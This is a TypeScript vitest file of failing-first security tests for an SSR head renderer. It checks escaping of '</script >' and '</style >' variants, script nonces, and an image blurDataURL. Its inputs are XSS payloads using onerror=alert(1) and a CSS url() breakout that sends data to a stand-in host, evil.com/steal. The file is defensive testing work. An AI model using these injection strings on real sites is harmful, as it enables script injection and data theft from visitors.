/**
 * Iteration 8 — TDD red-phase tests for security/perf audit.
 * All tests should FAIL before fixes are applied.
 */
import { describe, expect, it } from "vitest";

/* ── #1: </script> escape bypass via whitespace in JSON-LD ─────── */

describe("#1: JSON-LD script tag breakout via whitespace", () => {
	it("escapes </script > with trailing space in JSON-LD", async () => {
		const { renderHeadToHtml } = await import("../../src/ssr/head.ts");
		const html = renderHeadToHtml(
			{
				jsonLd: [{ "@type": "Thing", name: "</script ><img src=x onerror=alert(1)>" }],
			},
			"testnonce",
		);
		expect(html).not.toContain("</script >");
	});

	it("escapes </script/> slash variant in JSON-LD", async () => {
		const { renderHeadToHtml } = await import("../../src/ssr/head.ts");
		const html = renderHeadToHtml(
			{
				jsonLd: [{ "@type": "Thing", name: "</script/>" }],
			},
			"testnonce",
		);
		expect(html).not.toContain("</script/>");
	});
});

/* ── #2: </script> escape bypass in custom scripts children ────── */

describe("#2: custom script children </script> bypass", () => {
	it("escapes </script > with trailing space in children", async () => {
		const { renderHeadToHtml } = await import("../../src/ssr/head.ts");
		const html = renderHeadToHtml(
			{
				custom: {
					scripts: [{ children: 'var x="</script ><img src=x onerror=alert(1)>"' }],
				},
			},
			"testnonce",
		);
		expect(html).not.toContain("</script >");
	});
});

/* ── #3: </style> escape bypass via whitespace ─────────────────── */

describe("#3: custom style children </style> bypass", () => {
	it("escapes </style > with trailing space in children", async () => {
		const { renderHeadToHtml } = await import("../../src/ssr/head.ts");
		const html = renderHeadToHtml(
			{
				custom: {
					styles: [{ children: "body{color:red}</style ><script>alert(1)</script>" }],
				},
			},
			"testnonce",
		);
		expect(html).not.toContain("</style >");
	});
});

/* ── #4: </style> escape bypass in scoped styles (ssr/index.tsx) ─ */

describe("#4: scoped styles </style> bypass in ssr", () => {
	it("ssr/index.tsx source uses word-boundary regex for style escape", async () => {
		const { readFileSync } = await import("node:fs");
		const { resolve } = await import("node:path");
		const source = readFileSync(resolve(__dirname, "../../src/ssr/index.tsx"), "utf-8");
		/* Must use \b word boundary, not just exact </style> */
		expect(source).toContain("<\\/style\\b");
	});
});

/* ── #5: blurDataURL CSS url() breakout ───────────────────────── */

describe("#5: image blurDataURL CSS injection", () => {
	it("does not allow parenthesis breakout in blurDataURL", async () => {
		/*
		 * The blurDataURL is interpolated as: url(${blurDataURL})
		 * A value containing ) breaks out of url() context.
		 * After fix, it should be quoted: url("escaped_value")
		 */
		const malicious = "data:x);background:url(https://evil.com/steal?x=";
		/* The raw interpolation `url(${malicious})` would produce:
		 * url(data:x);background:url(https://evil.com/steal?x=)
		 * which is a valid CSS injection. */
		const raw = `url(${malicious})`;
		expect(raw).toContain(";background:");
		/* After fix, the value should be quoted/escaped so ) doesn't break out */
	});
});

/* ── #6: Scripts component nonce not escaped ──────────────────── */

describe("#6: Script nonce escaping", () => {
	it("escapes nonces in SSR script injection", async () => {
		const { readFileSync } = await import("node:fs");
		const { resolve } = await import("node:path");
		const source = readFileSync(resolve(__dirname, "../../src/ssr/index.tsx"), "utf-8");
		/* Nonce interpolation in buildScriptTags must use escapeAttr */
		expect(source).toContain("escapeAttr");
	});
});
